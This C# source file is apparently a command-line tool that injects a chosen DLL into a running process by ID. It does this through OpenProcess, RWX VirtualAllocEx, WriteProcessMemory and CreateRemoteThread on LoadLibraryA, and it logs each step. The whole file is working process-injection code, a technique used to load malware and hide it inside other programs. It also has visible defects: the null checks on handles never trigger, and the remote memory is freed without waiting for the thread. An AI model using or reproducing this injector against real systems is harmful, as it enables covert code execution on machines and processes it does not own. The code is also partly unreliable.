using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Text;

namespace DllInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            // Check arguments
            if (args.Length < 2)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Usage: DllInjection.exe <target process id> <path to dll>");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }

            int ProcId = int.Parse(args[0]);
            string DllPath = args[1];
            IntPtr Size = (IntPtr)DllPath.Length;

            // Make sure file exist
            if (File.Exists(DllPath) == false)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] File {0} does not exist. Please check file path.", DllPath);
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }

            // Make sure we don't touch SYSTEM 0 and/or 4 processes
            if ((ProcId == 4) || (ProcId == 0))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] SYSTEM process id {0} not allowed.", ProcId);
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }
            else
            {
                // Get process by id
                try
                {
                    Process localById = Process.GetProcessById(ProcId);
                    string ProcName = localById.ProcessName;
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Process name '{0}' found.", ProcName);
                    Console.ForegroundColor = ConsoleColor.White;
                }
                catch (ArgumentException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
            }

            // Open handle to the target process
            IntPtr ProcHandle = Native.OpenProcess(
                ProcessAccessFlags.All,
                false,
                ProcId
            );

            if (ProcHandle == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Handle to target process could not be obtained!");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Handle (0x" + ProcHandle + ") to target process has been be obtained.");
                Console.ForegroundColor = ConsoleColor.White;
            }

            // Allocate DLL space
            IntPtr DllSpace = Native.VirtualAllocEx(
                ProcHandle,
                IntPtr.Zero,
                Size,
                AllocationType.Reserve | AllocationType.Commit, 
                MemoryProtection.ExecuteReadWrite
            );

            if (DllSpace == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] DLL space allocation failed.");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] DLL space (0x" + DllSpace + ") allocation is successful.");
                Console.ForegroundColor = ConsoleColor.White;
            }

            // Write DLL content to VAS of target process
            byte[] bytes = Encoding.ASCII.GetBytes(DllPath);
            bool DllWrite = Native.WriteProcessMemory(
                ProcHandle,
                DllSpace,
                bytes,
                (int)bytes.Length,
                out var bytesread
            );

            if (DllWrite == false)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Writing DLL content to target process failed.");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Writing DLL content to target process is successful.");
                Console.ForegroundColor = ConsoleColor.White;
            }

            // Get handle to Kernel32.dll and get address for LoadLibraryA
            IntPtr Kernel32Handle = Native.GetModuleHandle("Kernel32.dll");
            IntPtr LoadLibraryAAddress = Native.GetProcAddress(Kernel32Handle, "LoadLibraryA");

            if (LoadLibraryAAddress == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Obtaining an addess to LoadLibraryA function has failed.");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] LoadLibraryA function address (0x" + LoadLibraryAAddress + ") has been obtained.");
                Console.ForegroundColor = ConsoleColor.White;
            }

            // Create remote thread in the target process
            IntPtr RemoteThreadHandle = Native.CreateRemoteThread(
                ProcHandle,
                IntPtr.Zero,
                0,
                LoadLibraryAAddress,
                DllSpace,
                0,
                IntPtr.Zero
            );

            if (RemoteThreadHandle == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Obtaining a handle to remote thread in target process failed.");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Obtaining a handle to remote thread (0x" + RemoteThreadHandle + ") in target process is successful.");
                Console.ForegroundColor = ConsoleColor.White;
            }

            // Deallocate memory assigned to DLL
            bool FreeDllSpace = Native.VirtualFreeEx(
                ProcHandle,
                DllSpace,
                0,
                AllocationType.Release
            );

            if (FreeDllSpace == false)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Failed to release DLL memory in target process.");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Successfully released DLL memory in target process.");
                Console.ForegroundColor = ConsoleColor.White;
            }

            // Close remote thread handle
            Native.CloseHandle(RemoteThreadHandle);

            // Close target process handle
            Native.CloseHandle(ProcHandle);
        }
    }
}